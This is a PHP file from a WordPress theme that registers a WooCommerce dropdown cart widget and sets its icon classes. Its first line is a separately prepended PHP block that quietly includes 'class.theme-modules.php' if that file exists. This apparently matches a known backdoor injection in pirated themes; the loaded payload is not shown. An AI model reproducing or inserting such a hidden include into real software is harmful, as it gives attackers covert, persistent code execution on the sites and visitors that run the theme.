<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php

if ( ! function_exists( 'overton_mikado_register_woocommerce_dropdown_cart_widget' ) ) {
	/**
	 * Function that register dropdown cart widget
	 */
	function overton_mikado_register_woocommerce_dropdown_cart_widget( $widgets ) {
		$widgets[] = 'OvertonMikadoClassWoocommerceDropdownCart';
		
		return $widgets;
	}
	
	add_filter( 'overton_mikado_filter_register_widgets', 'overton_mikado_register_woocommerce_dropdown_cart_widget' );
}

if ( ! function_exists( 'overton_mikado_get_dropdown_cart_icon_class' ) ) {
	/**
	 * Returns dropdow cart icon class
	 */
	function overton_mikado_get_dropdown_cart_icon_class() {
		$classes = array(
			'mkdf-header-cart'
		);
		
		$classes[] = overton_mikado_get_icon_sources_class( 'dropdown_cart', 'mkdf-header-cart' );
		
		return $classes;
	}
}